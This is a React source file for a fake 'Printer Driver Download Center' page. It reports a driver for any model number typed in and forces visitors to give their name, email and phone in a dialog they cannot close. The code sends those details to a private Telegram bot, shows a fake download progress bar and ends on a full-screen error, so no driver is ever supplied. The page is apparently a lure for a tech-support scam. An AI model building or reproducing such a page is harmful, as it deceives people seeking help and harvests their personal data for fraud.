import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Printer } from "lucide-react";
import FullScreenError from "@/components/FullScreenError";
import DriverSearchForm from "@/components/DriverSearchForm";
import DriverDownloadCard from "@/components/DriverDownloadCard";
import DownloadProgress from "@/components/DownloadProgress";

const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

const DriverDownload = () => {
  const [modelNumber, setModelNumber] = useState("");
  const [showDrivers, setShowDrivers] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [downloading, setDownloading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [progress, setProgress] = useState(0);
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
  });
  const { toast } = useToast();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const sendToTelegram = async (data: typeof formData) => {
    const message = `
New Driver Download Request:
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone}
Model: ${modelNumber}
    `;

    try {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
          }),
        }
      );
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
    }
  };

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (modelNumber.trim()) {
      setShowDrivers(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
      toast({
        title: "Driver Found",
        description: "Compatible driver package found for your printer model.",
      });
    }
  };

  const handleDownload = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendToTelegram(formData);
    setShowForm(false);
    setDownloading(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
    toast({
      title: "Download Started",
      description: "Your driver package is being prepared...",
    });

    for (let i = 0; i <= 100; i += 10) {
      await new Promise((resolve) => setTimeout(resolve, 800));
      setProgress(i);
    }

    setDownloading(false);
    setShowError(true);
  };

  if (showError) {
    return <FullScreenError />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100">
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-8">
            <div className="flex justify-center mb-6">
              <Printer className="h-16 w-16 text-primary" />
            </div>
            <h1 className="text-3xl font-bold text-gray-900 mb-3">
              Printer Driver Download Center
            </h1>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              Get the latest drivers and software for your printer. Enter your
              model number to begin.
            </p>
          </div>

          {!showDrivers && (
            <div className="bg-white p-6 rounded-lg shadow-lg">
              <DriverSearchForm
                modelNumber={modelNumber}
                setModelNumber={setModelNumber}
                handleSearch={handleSearch}
              />
            </div>
          )}

          {showDrivers && !downloading && (
            <div className="bg-white p-6 rounded-lg shadow-lg animate-fadeIn">
              <h2 className="text-2xl font-semibold mb-6 flex items-center gap-2">
                <Printer className="h-6 w-6 text-primary" />
                Available Drivers for {modelNumber}
              </h2>
              <DriverDownloadCard
                modelNumber={modelNumber}
                onDownloadClick={() => setShowForm(true)}
              />
            </div>
          )}

          <Dialog open={showForm} onOpenChange={() => {}}>
            <DialogContent
              className="sm:max-w-md"
              onPointerDownOutside={(e) => e.preventDefault()}
            >
              <DialogHeader>
                <DialogTitle>Complete Download Registration</DialogTitle>
              </DialogHeader>
              <form onSubmit={handleDownload} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input
                    id="name"
                    required
                    placeholder="John Doe"
                    value={formData.name}
                    onChange={(e) =>
                      setFormData({ ...formData, name: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    required
                    placeholder="john@example.com"
                    value={formData.email}
                    onChange={(e) =>
                      setFormData({ ...formData, email: e.target.value })
                    }
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input
                    id="phone"
                    required
                    placeholder="+1 (555) 000-0000"
                    value={formData.phone}
                    onChange={(e) =>
                      setFormData({ ...formData, phone: e.target.value })
                    }
                  />
                </div>
                <Button type="submit" className="w-full">
                  Start Download
                </Button>
                <p className="text-sm text-gray-500 text-center">
                  By downloading, you agree to our Terms of Service and Privacy
                  Policy
                </p>
              </form>
            </DialogContent>
          </Dialog>

          {downloading && (
            <div className="bg-white p-6 rounded-lg shadow-lg animate-fadeIn">
              <DownloadProgress progress={progress} />
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default DriverDownload;
